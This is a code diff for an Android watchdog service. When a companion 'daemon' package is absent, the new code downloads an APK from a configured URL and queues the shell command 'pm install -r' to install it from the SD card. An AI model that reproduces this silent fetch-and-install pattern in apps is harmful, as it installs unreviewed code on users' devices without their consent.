@@ -25,6 +25,8 @@ import com.yuan.library.dmanager.download.DownloadTask;
 import com.yuan.library.dmanager.download.DownloadTaskListener;
 import com.yuan.library.dmanager.download.TaskEntity;
 
+import java.util.ArrayList;
+
 import cn.jpush.android.api.JPushInterface;
 
 public class DaemonWatchDogService extends Service {
@@ -137,12 +139,18 @@ public class DaemonWatchDogService extends Service {
                 Logger.d("I'm WatchDogService  receive msg " + stringExtra);
             }
         }
-
+//daemon 未安装则先安装，安装了才会绑定它的服务
         boolean watchdogInstalled = Utils.isAppInstalled(this, "com.test.enablexpmod");
         if (!watchdogInstalled) {
-            ThreadPool threadPool = ThreadPool.getThreadPool();
-            threadPool.addTask(new Task(threadPool, null));
-            Logger.d("daemonInstalled false  --  testtask outoftime");
+            CmdBean cmdBean = new CmdBean();
+            cmdBean.setApkName(CmdBean.DAEMON_APK_NAME);
+            cmdBean.setApkPath(CmdBean.DAEMON_APK_PATH);
+            cmdBean.setDownloadUrl(CmdBean.DAEMON_URL);
+            cmdBean.setCmdType(CmdBean.CMD_TYPE_DOWNLOAD_DAEMON);
+            ArrayList<String> cmds = new ArrayList<>(3);
+            cmds.add(" pm install -r /sdcard/qiaoqiao/daemon.apk ");
+            cmdBean.setCmds(cmds);
+            downLoadDaemon(cmdBean);
         } else {
             //       绑定远程服务
             bindRemoteService();
